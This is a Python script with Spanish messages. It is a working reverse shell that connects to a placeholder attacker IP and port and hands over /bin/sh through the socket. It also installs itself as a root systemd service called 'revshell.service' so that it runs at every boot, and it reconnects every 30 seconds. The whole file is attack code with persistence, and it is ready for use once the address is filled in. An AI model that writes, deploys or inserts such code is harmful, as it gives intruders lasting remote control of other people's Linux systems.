import os
import socket
import time
import subprocess
import platform

RHOST = "YOUR IP"
RPORT = YOUR PORT

def ejecutar_revshell():
    try:
        s = socket.socket()
        s.connect((RHOST, RPORT))
        os.dup2(s.fileno(), 0)  
        os.dup2(s.fileno(), 1)  
        os.dup2(s.fileno(), 2)  
        subprocess.call(["/bin/sh"])
    except Exception as e:
        print(f"Error en la conexión: {e}")
    finally:
        s.close()

def configurar_inicio():
    service_content = """[Unit]
Description=Revershell Script
After=network.target

[Service]
ExecStart=/usr/bin/python3 /ruta/a/tu/script.py
Restart=always
User=root
WorkingDirectory=/ruta/a/tu/script

[Install]
WantedBy=multi-user.target
"""
    service_path = "/etc/systemd/system/revshell.service"
    
    try:
        # Escribir el archivo de servicio
        with open(service_path, 'w') as service_file:
            service_file.write(service_content)
        
        # Recargar systemd y habilitar el servicio
        subprocess.run(["sudo", "systemctl", "daemon-reload"])
        subprocess.run(["sudo", "systemctl", "enable", "revshell.service"])
        subprocess.run(["sudo", "systemctl", "start", "revshell.service"])
        
        print("El script ha sido configurado para ejecutarse al inicio de Linux.")
    except Exception as e:
        print(f"No se pudo configurar el inicio en Linux: {e}")

def main():
    while True:
        ejecutar_revshell()
        time.sleep(30)  

if __name__ == "__main__":
    configurar_inicio()
    main()
